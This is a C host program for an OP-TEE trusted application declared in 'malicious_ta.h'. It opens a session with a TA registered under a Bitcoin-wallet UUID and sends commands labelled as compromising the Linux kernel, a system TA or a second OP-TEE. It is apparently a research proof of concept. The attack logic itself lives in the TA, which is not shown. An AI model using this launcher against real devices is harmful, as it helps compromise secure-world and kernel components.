#include <err.h>
#include <stdio.h>
#include <string.h>
#include <tee_client_api.h>
#include <malicious_ta.h>
#include <main.h>
#include <stdlib.h>
#include <tx.h>
#include <time.h>
#include <unistd.h>

static TEEC_Result ta_compromise_linux(TEEC_Session *sess)
{
	TEEC_Operation op;
	TEEC_Result res;
        uint32_t err_origin;

	memset(&op, 0, sizeof(op));

	printf("Invoking TA to compromise linux kernel...\n");

	res = TEEC_InvokeCommand(sess, TA_MALICIOUS_CMD_1, &op, &err_origin);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x", res, err_origin);
	
	return res;
}

static TEEC_Result ta_compromise_system_ta(TEEC_Session *sess){
	TEEC_Operation op;
	TEEC_Result res;
        uint32_t err_origin;

	memset(&op, 0, sizeof(op));

	printf("Invoking TA to compromise system TA...\n");

	res = TEEC_InvokeCommand(sess, TA_MALICIOUS_CMD_2, &op, &err_origin);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x", res, err_origin);
	
	return res;
}

static TEEC_Result compromise_second_tee(TEEC_Session *sess){
	TEEC_Operation op;
	TEEC_Result res;
        uint32_t err_origin;

	memset(&op, 0, sizeof(op));

	printf("Invoking TA to compromise the other OP-TEE...\n");

	res = TEEC_InvokeCommand(sess, TA_MALICIOUS_CMD_3, &op, &err_origin);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x", res, err_origin);
	
	return res;
}

int main(int argc, char *argv[])
{
	TEEC_Result res;
	TEEC_Context ctx;
	TEEC_Session sess;
	TEEC_UUID uuid = TA_BITCOIN_WALLET_UUID;
        uint32_t err_origin;
        uint32_t cmd_id = 1;

        int len = strlen(argv[0]);
        int is_first = (argv[0][len-1]-'0') != 2;


        if(argc >= 2)
            cmd_id = argv[1][0]-'0';
        else
            cmd_id = 1;
	
	// Initiliaze context
	res = TEEC_InitializeContext(NULL, &ctx);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_InitializeContext failed with code 0x%x", res);
	
	// Open session with TA
	res = TEEC_OpenSession(&ctx, &sess, &uuid, TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x", res, err_origin);


	switch(cmd_id){
	    case 1:
		res = ta_compromise_linux(&sess);
		break;
	    case 2:
		res = ta_compromise_system_ta(&sess);
		break;
            case 3:
		res = compromise_second_tee(&sess);
		break;
	    default:
		printf("Unknown option, exiting\n");
		break;
	}

	// Close session
	TEEC_CloseSession(&sess);

	TEEC_FinalizeContext(&ctx);

	return 0;
}


